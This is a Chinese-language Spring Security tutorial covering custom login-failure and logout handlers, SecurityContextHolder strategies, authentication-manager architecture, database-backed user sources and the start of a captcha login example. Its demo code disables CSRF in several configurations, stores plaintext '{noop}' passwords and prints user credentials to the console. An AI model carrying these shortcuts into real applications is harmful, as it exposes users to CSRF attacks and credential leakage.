0.设置页面展示\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <title>主页</title>\n  </head>\n  <body>\n    <p th:text="${SPRING_SECURITY_LAST_EXCEPTION}"></p>\n    <h1>hello world</h1>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 1. 设置错误跳转页面\n\n跳转和成功跳转一样，分为\n\n * 重定向：错误信息存储到Session域中，需要从Session域取。\n * 转发：错误信息存储到request域中，需要从request域取。\n   * 在转发时需要注意，不能使用addViewController，否则会报错，无法解析POST请求。\n\n//                .failureUrl("/index")  // 重定向\n.failureForwardUrl("/login")  // 转发\n\n\n1\n2\n\n\n设置完成之后，登录失败就可以跳转到指定页面，并显示页面上的错误信息了。\n\n# 自定义认证失败处理器\n\n和上面的成功一样，为了配合前后端分离，登录失败也可以自定义失败处理器，返回一个json给前端。\n\n# 0. 自定义失败处理器\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.springframework.security.core.AuthenticationException;\nimport org.springframework.security.web.authentication.AuthenticationFailureHandler;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.HashMap;\n\npublic class CustomerAuthenticationFailureHandler implements AuthenticationFailureHandler {\n    @Override\n    public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException exception) throws IOException, ServletException {\n        HashMap<String, Object> hashMap = new HashMap<>();\n        hashMap.put("msg","认证失败");\n        hashMap.put("code",400);\n        response.setContentType("application/json;charset=utf8");\n        String result = new ObjectMapper().writeValueAsString(hashMap);\n        response.getWriter().write(result);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 1. 配置认证失败处理器\n\n.failureHandler(new CustomerAuthenticationFailureHandler())\n\n\n1\n\n\n\n# 自定义注销处理\n\nSpring Security 中也提供了默认的注销登录配置，在开发时也可以按照自己需求对注销进行个性化定制。默认的注销请求地址为/logout，因此只需要发送get请求到当前的地址即可完成注销。\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeHttpRequests()\n      //...\n      .and()\n      .formLogin()\n      //...\n      .and()\n      .logout()\n      .logoutUrl("/logout")\n      .invalidateHttpSession(true)\n      .clearAuthentication(true)\n      .logoutSuccessUrl("/login.html")\n      .and()\n      .csrf().disable();//这里先关闭 CSRF\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * 通过 logout() 方法开启注销配置\n * logoutUrl 指定退出登录请求地址，默认是 GET 请求，路径为 /logout\n * invalidateHttpSession 退出时是否是 session 失效，默认值为 true\n * clearAuthentication 退出时是否清除认证信息，默认值为 true\n * logoutSuccessUrl 退出登录时跳转地址\n\n同时，spring security也提供了个性化定制的可能，支持配置多个注销请求地址，和请求方式。同时为了更好的适配前后端分离的系统，支持自定义注销处理器。\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n\t\t@Override\n    protected void configure(HttpSecurity http) throws Exception {\n        http.authorizeHttpRequests()\n                //...\n                .and()\n                .formLogin()\n                //...\n                .and()\n                .logout()\n                .logoutRequestMatcher(new OrRequestMatcher(\n                        new AntPathRequestMatcher("/logout1","GET"),\n                        new AntPathRequestMatcher("/logout","GET")\n                ))\n                .invalidateHttpSession(true)\n                .clearAuthentication(true)\n                .logoutSuccessUrl("/login.html")\n                .and()\n                .csrf().disable();//这里先关闭 CSRF\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 自定义注销处理器\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.springframework.security.core.Authentication;\nimport org.springframework.security.web.authentication.logout.LogoutSuccessHandler;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.HashMap;\n\npublic class CustomerLogoutSuccessHandler implements LogoutSuccessHandler {\n    @Override\n    public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {\n        HashMap<String, Object> hashMap = new HashMap<>();\n        hashMap.put("code",200);\n        hashMap.put("msg","注销成功！");\n        String re = new ObjectMapper().writeValueAsString(hashMap);\n        response.setContentType("application/json;charset=utf8");\n        response.getWriter().write(re);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n配置处理器\n\n.logoutSuccessHandler(new CustomerLogoutSuccessHandler())\n\n\n1\n\n\n\n# 登陆成功后的信息获取\n\n# SecurityContextHolder\n\nSpring Security 会将登录用户数据保存在 Session 中。但是，为了使用方便,Spring Security在此基础上还做了一些改进，其中最主要的一个变化就是线程绑定。当用户登录成功后,Spring Security 会将登录成功的用户信息保存到 SecurityContextHolder 中。\n\nSecurityContextHolder 中的数据保存默认是通过ThreadLocal 来实现的，使用 ThreadLocal 创建的变量只能被当前线程访问，不能被其他线程访问和修改，也就是用户数据和请求线程绑定在一起。当登录请求处理完毕后，Spring Security 会将 SecurityContextHolder 中的数据拿出来保存到 Session 中，同时将 SecurityContexHolder 中的数据清空。以后每当有请求到来时，Spring Security 就会先从 Session 中取出用户登录数据，保存到SecurityContextHolder 中，方便在该请求的后续处理过程中使用，同时在请求结束时将 SecurityContextHolder 中的数据拿出来保存到 Session 中，然后将SecurityContextHolder 中的数据清空。\n\n实际上 SecurityContextHolder 中存储是 SecurityContext，在 SecurityContext 中存储是 Authentication。\n\n\n\n这种设计是典型的策略设计模式:\n\npublic class SecurityContextHolder {\n\tpublic static final String MODE_THREADLOCAL = "MODE_THREADLOCAL";\n\tpublic static final String MODE_INHERITABLETHREADLOCAL = "MODE_INHERITABLETHREADLOCAL";\n\tpublic static final String MODE_GLOBAL = "MODE_GLOBAL";\n\tprivate static final String MODE_PRE_INITIALIZED = "MODE_PRE_INITIALIZED";\n\tprivate static SecurityContextHolderStrategy strategy;\n  //....\n\tprivate static void initializeStrategy() {\n\t\tif (MODE_PRE_INITIALIZED.equals(strategyName)) {\n\t\t\tAssert.state(strategy != null, "When using " + MODE_PRE_INITIALIZED\n\t\t\t\t\t+ ", setContextHolderStrategy must be called with the fully constructed strategy");\n\t\t\treturn;\n\t\t}\n\t\tif (!StringUtils.hasText(strategyName)) {\n\t\t\t// Set default\n\t\t\tstrategyName = MODE_THREADLOCAL;\n\t\t}\n\t\tif (strategyName.equals(MODE_THREADLOCAL)) {\n\t\t\tstrategy = new ThreadLocalSecurityContextHolderStrategy();\n\t\t\treturn;\n\t\t}\n\t\tif (strategyName.equals(MODE_INHERITABLETHREADLOCAL)) {\n\t\t\tstrategy = new InheritableThreadLocalSecurityContextHolderStrategy();\n\t\t\treturn;\n\t\t}\n\t\tif (strategyName.equals(MODE_GLOBAL)) {\n\t\t\tstrategy = new GlobalSecurityContextHolderStrategy();\n\t\t\treturn;\n\t\t}\n    //.....\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n 1. MODE THREADLOCAL：这种存放策略是将 SecurityContext 存放在 ThreadLocal中，大家知道 Threadlocal 的特点是在哪个线程中存储就要在哪个线程中读取，这其实非常适合 web 应用，因为在默认情况下，一个请求无论经过多少 Filter 到达 Servlet，都是由一个线程来处理的。这也是 SecurityContextHolder 的默认存储策略，这种存储策略意味着如果在具体的业务处理代码中，开启了子线程，在子线程中去获取登录用户数据，就会获取不到。\n 2. MODE INHERITABLETHREADLOCAL：这种存储模式适用于多线程环境，如果希望在子线程中也能够获取到登录用户数据，那么可以使用这种存储模式。\n 3. MODE GLOBAL：这种存储模式实际上是将数据保存在一个静态变量中，在 JavaWeb开发中，这种模式很少使用到。\n\n# SecurityContextHolderStrategy\n\n通过 SecurityContextHolder 可以得知，SecurityContextHolderStrategy 接口用来定义存储策略方法\n\npublic interface SecurityContextHolderStrategy {\n\tvoid clearContext();\n\tSecurityContext getContext();\n\tvoid setContext(SecurityContext context);\n\tSecurityContext createEmptyContext();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n接口中一共定义了四个方法：\n\n * clearContext：该方法用来清除存储的 SecurityContext对象。\n * getContext：该方法用来获取存储的 SecurityContext 对象。\n * setContext：该方法用来设置存储的 SecurityContext 对象。\n * create Empty Context：该方法则用来创建一个空的 SecurityContext 对象。\n\n\n\n从上面可以看出每一个实现类对应一种策略的实现。\n\n# 代码中获取认证之后用户数据\n\n@RestController\npublic class HelloController {\n    @RequestMapping("/hello")\n    public String hello() {\n      Authentication authentication = SecurityContextHolder\n        .getContext().getAuthentication();\n      User principal = (User) authentication.getPrincipal();\n      System.out.println("身份 :"+principal.getUsername());\n      System.out.println("凭证 :"+authentication.getCredentials());\n      System.out.println("权限 :"+authentication.getAuthorities());\n      return "hello security";\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 多线程情况下获取用户数据\n\n@RestController\npublic class HelloController {\n    @RequestMapping("/hello")\n    public String hello() {\n      new Thread(()->{\n        Authentication authentication = SecurityContextHolder\n          .getContext().getAuthentication();\n        User principal = (User) authentication.getPrincipal();\n        System.out.println("身份 :"+principal.getUsername());\n        System.out.println("凭证 :"+authentication.getCredentials());\n        System.out.println("权限 :"+authentication.getAuthorities());\n      }).start();\n      return "hello security";\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n\n可以看到默认策略，是无法在子线程中获取用户信息，如果需要在子线程中获取必须使用第二种策略，默认策略是通过 System.getProperty 加载的，因此我们可以通过增加 VM Options 参数进行修改。\n\n-Dspring.security.strategy=MODE_INHERITABLETHREADLOCAL\n\n\n1\n\n\n\n\n# 页面上获取用户信息\n\n * 引入依赖\n   \n   <dependency>\n     <groupId>org.thymeleaf.extras</groupId>\n     <artifactId>thymeleaf-extras-springsecurity5</artifactId>\n     <version>3.0.4.RELEASE</version>\n   </dependency>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n * 页面加入命名空间\n   \n   <html lang="en" xmlns:th="https://www.thymeleaf.org" \n   xmlns:sec="http://www.thymeleaf.org/extras/spring-security">\n   \n   \n   1\n   2\n   \n\n * 页面中使用\n   \n   \x3c!--获取认证用户名--\x3e\n   <ul>\n     <li sec:authentication="principal.username"></li>\n     <li sec:authentication="principal.authorities"></li>\n     <li sec:authentication="principal.accountNonExpired"></li>\n     <li sec:authentication="principal.accountNonLocked"></li>\n     <li sec:authentication="principal.credentialsNonExpired"></li>\n   </ul>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n\n\n# 自定义认证数据源\n\n# 认证流程分析\n\nhttps://docs.spring.io/spring-security/reference/servlet/authentication/architecture.html\n\n\n\n * 发起认证请求，请求中携带用户名、密码，该请求会被UsernamePasswordAuthenticationFilter 拦截\n * 在UsernamePasswordAuthenticationFilter的attemptAuthentication方法中将请求中用户名和密码，封装为Authentication对象，并交给AuthenticationManager 进行认证\n * 认证成功，将认证信息存储到 SecurityContextHodler 以及调用记住我等，并回调 AuthenticationSuccessHandler 处理\n * 认证失败，清除 SecurityContextHodler 以及 记住我中信息，回调 AuthenticationFailureHandler 处理\n\n# 三者关系\n\n从上面分析中得知，AuthenticationManager 是认证的核心类，但实际上在底层真正认证时还离不开 ProviderManager 以及 AuthenticationProvider 。他们三者关系是样的呢？\n\n * AuthenticationManager 是一个认证管理器，它定义了 Spring Security 过滤器要执行认证操作。\n * ProviderManager AuthenticationManager接口的实现类。Spring Security 认证时默认使用就是 ProviderManager。\n * AuthenticationProvider 就是针对不同的身份类型执行的具体的身份认证。\n\nAuthenticationManager 与 ProviderManager\n\n\n\nProviderManager 是 AuthenticationManager 的唯一实现，也是 Spring Security 默认使用实现。从这里不难看出默认情况下AuthenticationManager 就是一个ProviderManager。\n\nProviderManager 与 AuthenticationProvider\n\n摘自官方: https://docs.spring.io/spring-security/reference/servlet/authentication/architecture.html\n\n\n\n在 Spring Seourity 中，允许系统同时支持多种不同的认证方式，例如同时支持用户名/密码认证、ReremberMe 认证、手机号码动态认证等，而不同的认证方式对应了不同的AuthenticationProvider，所以一个完整的认证流程可能由多个AuthenticationProvider来提供。\n\n多个 AuthenticationProvider 将组成一个列表，这个列表将由 ProviderManager 代理。换句话说，在ProviderManager 中存在一个 AuthenticationProvider 列表，在Provider Manager 中遍历列表中的每一个AuthenticationProvider 去执行身份认证，最终得到认证结果。\n\nProviderManager 本身也可以再配置一个 AuthenticationManager作为 parent，这样当ProviderManager认证失败之后，就可以进入到 parent 中再次进行认证。理论上来说，ProviderManager 的 parent 可以是任意类型的AuthenticationManager，但是通常都是由 ProviderManager来扮演 parent 的角色，也就是ProviderManager是 ProviderManager的 parent。\n\nProviderManager本身也可以有多个，多个ProviderManager 共用同一个 parent。有时，一个应用程序有受保护资源的逻辑组（例如，所有符合路径模式的网络资源，如/api/**），每个组可以有自己的专用 AuthenticationManager。通常，每个组都是一个ProviderManager，它们共享一个父级。然后，父级是一种 全局资源，作为所有提供者的后备资源。\n\n根据上面的介绍，我们绘出新的 AuthenticationManager、ProvideManager 和 AuthentictionProvider关系\n\n摘自官网: https://spring.io/guides/topicals/spring-security-architecture\n\n\n\n弄清楚认证原理之后我们来看下具体认证时数据源的获取。**默认情况下 AuthenticationProvider 是由 DaoAuthenticationProvider 类来实现认证的，在DaoAuthenticationProvider 认证时又通过 UserDetailsService 完成数据源的校验。**他们之间调用关系如下：\n\n\n\n总结: AuthenticationManager 是认证管理器，在 Spring Security 中有全局AuthenticationManager，也可以有局部AuthenticationManager。全局的AuthenticationManager用来对全局认证进行处理，局部的AuthenticationManager用来对某些特殊资源认证处理。当然无论是全局认证管理器还是局部认证管理器都是由 ProviderManger 进行实现。 每一个ProviderManger中都代理一个AuthenticationProvider的列表，列表中每一个实现代表一种身份认证方式。认证时底层数据源需要调用 UserDetailService 来实现。\n\n# 配置全局 AuthenticationManager\n\nhttps://spring.io/guides/topicals/spring-security-architecture\n\n默认的全局 AuthenticationManager\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n  @Autowired\n  public void initialize(AuthenticationManagerBuilder builder) {\n    //builder..\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * springboot 对 security 进行自动配置时自动在工厂中创建一个全局AuthenticationManager\n\n总结\n\n 1. 默认自动配置创建全局AuthenticationManager 默认找当前项目中是否存在自定义 UserDetailService 实例 自动将当前项目 UserDetailService 实例设置为数据源\n 2. 默认自动配置创建全局AuthenticationManager 在工厂中使用时直接在代码中注入即可\n\n自定义全局 AuthenticationManager\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n  @Override\n  public void configure(AuthenticationManagerBuilder builder) {\n  \t//builder ....\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n总结\n\n 1. 会将工厂中自动配置AuthenticationManager 进行覆盖\n 2. 需要在实现中指定认证数据源对象 UserDetaiService 实例\n 3. 这种方式创建AuthenticationManager对象工厂内部本地一个 AuthenticationManager 对象 不允许在其他自定义组件中进行注入\n\n用来在工厂中暴露自定义AuthenticationManager 实例\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n  \n    //1.自定义AuthenticationManager  推荐  并没有在工厂中暴露出来\n    @Override\n    public void configure(AuthenticationManagerBuilder builder) throws Exception {\n        System.out.println("自定义AuthenticationManager: " + builder);\n        builder.userDetailsService(userDetailsService());\n    }\n\n    //作用: 用来将自定义AuthenticationManager在工厂中进行暴露,可以在任何位置注入\n    @Override\n    @Bean\n    public AuthenticationManager authenticationManagerBean() throws Exception {\n        return super.authenticationManagerBean();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 自定义内存数据源\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n\n    @Bean\n    public UserDetailsService userDetailsService(){\n        InMemoryUserDetailsManager inMemoryUserDetailsManager\n                = new InMemoryUserDetailsManager();\n        UserDetails u1 = User.withUsername("zhangs")\n                .password("{noop}111").roles("USER").build();\n        inMemoryUserDetailsManager.createUser(u1);\n        return inMemoryUserDetailsManager;\n    }\n\n    @Override\n    protected void configure(AuthenticationManagerBuilder auth) \n      throws Exception {\n        auth.userDetailsService(userDetailsService());\n    }  \t\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 自定义数据库数据源\n\n数据库数据表设计\n\n-- 用户表\nCREATE TABLE `user`\n(\n    `id`                    int(11) NOT NULL AUTO_INCREMENT,\n    `username`              varchar(32)  DEFAULT NULL,\n    `password`              varchar(255) DEFAULT NULL,\n    `enabled`               tinyint(1) DEFAULT NULL,\n    `accountNonExpired`     tinyint(1) DEFAULT NULL,\n    `accountNonLocked`      tinyint(1) DEFAULT NULL,\n    `credentialsNonExpired` tinyint(1) DEFAULT NULL,\n    PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;\n-- 角色表\nCREATE TABLE `role`\n(\n    `id`      int(11) NOT NULL AUTO_INCREMENT,\n    `name`    varchar(32) DEFAULT NULL,\n    `name_zh` varchar(32) DEFAULT NULL,\n    PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;\n-- 用户角色关系表\nCREATE TABLE `user_role`\n(\n    `id`  int(11) NOT NULL AUTO_INCREMENT,\n    `uid` int(11) DEFAULT NULL,\n    `rid` int(11) DEFAULT NULL,\n    PRIMARY KEY (`id`),\n    KEY   `uid` (`uid`),\n    KEY   `rid` (`rid`)\n) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;\n\n-- 插入用户数据\nBEGIN;\n  INSERT INTO `user`\n  VALUES (1, \'root\', \'{noop}123\', 1, 1, 1, 1);\n  INSERT INTO `user`\n  VALUES (2, \'admin\', \'{noop}123\', 1, 1, 1, 1);\n  INSERT INTO `user`\n  VALUES (3, \'blr\', \'{noop}123\', 1, 1, 1, 1);\nCOMMIT;\n-- 插入角色数据\nBEGIN;\n  INSERT INTO `role`\n  VALUES (1, \'ROLE_product\', \'商品管理员\');\n  INSERT INTO `role`\n  VALUES (2, \'ROLE_admin\', \'系统管理员\');\n  INSERT INTO `role`\n  VALUES (3, \'ROLE_user\', \'用户管理员\');\nCOMMIT;\n-- 插入用户角色数据\nBEGIN;\n  INSERT INTO `user_role`\n  VALUES (1, 1, 1);\n  INSERT INTO `user_role`\n  VALUES (2, 1, 2);\n  INSERT INTO `user_role`\n  VALUES (3, 2, 2);\n  INSERT INTO `user_role`\n  VALUES (4, 3, 3);\nCOMMIT;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n创建对应的实体类对象\n\npackage com.pwddd.springsecurity.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport org.springframework.security.core.GrantedAuthority;\nimport org.springframework.security.core.authority.SimpleGrantedAuthority;\nimport org.springframework.security.core.userdetails.UserDetails;\n\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.List;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class User implements UserDetails {\n    private Integer id;\n    private String username;\n    private String password;\n    private Boolean enabled;\n    private Boolean accountNonExpired;\n    private Boolean accountNonLocked;\n    private Boolean credentialsNonExpired;\n    private List<Role> roles = new ArrayList<>();\n\n    @Override\n    public Collection<? extends GrantedAuthority> getAuthorities() {\n        List<GrantedAuthority> grantedAuthorities = new ArrayList<>();\n        roles.forEach(role->grantedAuthorities.add(new SimpleGrantedAuthority(role.getName())));\n        return grantedAuthorities;\n    }\n\n    @Override\n    public String getPassword() {\n        return password;\n    }\n\n    @Override\n    public String getUsername() {\n        return username;\n    }\n\n    @Override\n    public boolean isAccountNonExpired() {\n        return accountNonExpired;\n    }\n\n    @Override\n    public boolean isAccountNonLocked() {\n        return accountNonLocked;\n    }\n\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return credentialsNonExpired;\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return enabled;\n    }\n\t\t//get/set....\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n角色对象\n\npackage com.pwddd.springsecurity.entity;\n\nimport lombok.*;\nimport org.springframework.context.annotation.Scope;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class Role {\n    private Integer id;\n    private String name;\n    private String nameZh;\n  \t//get set..\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n创建对应的Service\n\npackage com.pwddd.springsecurity.service.impl;\n\nimport com.pwddd.springsecurity.entity.User;\nimport com.pwddd.springsecurity.mapper.UserMapper;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.core.userdetails.UsernameNotFoundException;\nimport org.springframework.stereotype.Service;\nimport org.springframework.util.ObjectUtils;\n\n@Service\npublic class UserServiceImpl implements UserDetailsService {\n    @Autowired\n    private  UserMapper userDao;\n\n\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        User user = userDao.loadUserByUsername(username);\n        if(ObjectUtils.isEmpty(user))throw new RuntimeException("用户不存在");\n        user.setRoles(userDao.getRolesByUid(user.getId()));\n        return user;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n使用该Service\n\n@Autowired\nprivate UserServiceImpl userService;\n\n\n\n@Override\nprotected void configure(AuthenticationManagerBuilder builder) throws Exception {\n  builder.userDetailsService(userService);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 验证码案例\n\n# 传统Web案例\n\n 0. 创建一个新项目，引入web相关依赖，测试环境。引入spring security使用默认拦截测试。\n\n 1. 自定义SpringSecurity配置。\n\n   package com.pwddd.web.conf;\n   \n   import org.springframework.context.annotation.Configuration;\n   import org.springframework.security.config.annotation.web.builders.HttpSecurity;\n   import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n   \n   @Configuration\n   public class SecurityConfig extends WebSecurityConfigurerAdapter {\n     @Override\n     protected void configure(HttpSecurity http) throws Exception {\n       http.authorizeRequests()\n         //                .mvcMatchers("/test").permitAll()\n         .mvcMatchers("/login").permitAll()\n         .mvcMatchers("/doLogin").permitAll()\n         .anyRequest().authenticated()\n         .and()\n         .formLogin()\n         .loginPage("/login")\n         .defaultSuccessUrl("/index")\n         .failureUrl("/login")\n         .usernameParameter("uname")\n         .passwordParameter("passwd")\n         .loginProcessingUrl("/doLogin")\n         .and().csrf().disable();\n     }\n   }\n   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. 自定义数据源\n\n   package com.pwddd.web.service;\n   \n   import com.pwddd.web.entity.User;\n   import com.pwddd.web.mapper.UserMapper;\n   import org.springframework.beans.factory.annotation.Autowired;\n   import org.springframework.security.core.userdetails.UserDetails;\n   import org.springframework.security.core.userdetails.UserDetailsService;\n   import org.springframework.security.core.userdetails.UsernameNotFoundException;\n   import org.springframework.stereotype.Component;\n   import org.springframework.stereotype.Service;\n   \n   @Service\n   public class UserService implements UserDetailsService {\n   \n       private final UserMapper userMapper;\n   \n       public UserService(UserMapper userMapper) {\n           this.userMapper = userMapper;\n       }\n   \n       @Override\n       public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n           User user = userMapper.loadUserByUsername(username);\n           System.out.println(user);\n           if (user == null) throw new UsernameNotFoundException("用户名不正确");\n           return user;\n       }\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n   package com.pwddd.web.conf;\n   \n   import com.pwddd.web.service.UserService;\n   import org.springframework.context.annotation.Configuration;\n   import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;\n   import org.springframework.security.config.annotation.web.builders.HttpSecurity;\n   import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n   import org.springframework.security.core.userdetails.UserDetailsService;\n   \n   @Configuration\n   public class SecurityConfig extends WebSecurityConfigurerAdapter {\n   \n       private final UserService userService;\n   \n       public SecurityConfig(UserService userService) {\n           this.userService = userService;\n       }\n   \n       @Override\n       protected UserDetailsService userDetailsService() {\n           return userService;\n       }\n   \n       @Override\n       protected void configure(AuthenticationManagerBuilder auth) throws Exception {\n           auth.userDetailsService(userDetailsService());\n       }\n   \n       @Override\n       protected void configure(HttpSecurity http) throws Exception {\n           http.authorizeRequests()\n   //                .mvcMatchers("/test").permitAll()\n                   .mvcMatchers("/login").permitAll()\n                   .mvcMatchers("/doLogin").permitAll()\n                   .anyRequest().authenticated()\n                   .and()\n                   .formLogin()\n                   .loginPage("/login")\n                   .defaultSuccessUrl("/index")\n                   .failureUrl("/login")\n                   .usernameParameter("uname")\n                   .passwordParameter("passwd")\n                   .loginProcessingUrl("/doLogin")\n                   .and().csrf().disable();\n       }\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n 3. 生成验证码\n\n<dependency>\n  <groupId>com.github.penggle</groupId>\n  <artifactId>kaptcha</artifactId>\n  <version>2.3.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\npackage com.pwddd.web.conf;\n\nimport com.google.code.kaptcha.Producer;\nimport com.google.code.kaptcha.impl.DefaultKaptcha;\nimport com.google.code.kaptcha.util.Config;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.util.Properties;\n\n@Configuration\npublic class KaptchaConfig {\n\n  @Bean\n  public Producer kaptcha() {\n    Properties properties = new Properties();\n    properties.setProperty("kaptcha.image.width", "150");\n    properties.setProperty("kaptcha.image.height", "50");\n\n    properties.setProperty("kaptcha.textproducer.char.string", "0123456789");\n    properties.setProperty("kaptcha.textproducer.char.length", "4");\n    Config config = new Config(properties);\n    DefaultKaptcha defaultKaptcha = new DefaultKaptcha();\n    defaultKaptcha.setConfig(config);\n    return defaultKaptcha;\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n生成验证码\n\n@RequestMapping("/code")\npublic void verify(HttpServletResponse resp, HttpSession session) throws IOException {\n  resp.setContentType("image/png");\n  String code = producer.createText();\n  session.setAttribute("code",code);\n  BufferedImage image = producer.createImage(code);\n  ServletOutputStream outputStream = resp.getOutputStream();\n  ImageIO.write(image,"png",outputStream);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n添加到页面\n\n验证码： <input type="text" name="code"> <img th:src="@{/code}" alt="验证码" /> <br>\n\n\n1\n\n\n自定义验证码异常\n\npackage com.pwddd.web.ex;\n\n\nimport org.springframework.security.core.AuthenticationException;\n\npublic class CaptchaNotMatchException extends AuthenticationException {\n  public CaptchaNotMatchException(String msg) {\n    super(msg);\n  }\n\n  public CaptchaNotMatchException(String msg, Throwable cause) {\n    super(msg, cause);\n  }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n处理携带验证码的请求，自定义filter\n\npackage com.pwddd.web.filter;\n\nimport com.pwddd.web.ex.CaptchaNotMatchException;\nimport org.springframework.security.core.Authentication;\nimport org.springframework.security.core.AuthenticationException;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\nimport org.springframework.util.ObjectUtils;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic 